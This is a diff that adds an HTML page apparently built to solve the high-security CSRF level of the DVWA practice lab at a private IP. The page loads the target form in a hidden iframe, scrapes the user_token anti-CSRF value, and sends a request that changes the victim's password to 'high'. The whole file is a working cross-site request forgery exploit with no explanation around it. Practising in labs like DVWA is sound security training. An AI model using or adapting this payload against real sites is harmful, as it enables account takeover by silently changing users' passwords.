@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe id="csrf_vuln" src="http://10.6.66.42/dvwa/vulnerabilities/csrf/" style="visibility: hidden;" onload="payload()">
+  </iframe>
+  <script>
+  function payload() {
+    var iframe = document.getElementById('csrf_vuln');
+    var doc = iframe.contentWindow.document;
+    var token = doc.getElementsByName('user_token')[0].value;
+
+    const http = new XMLHttpRequest();
+    const url = 'http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=high&password_conf=high&Change=Change&user_token='+token;
+    http.open('GET', url);
+    http.send();
+  }
+  </script>
+</body>
+</html>
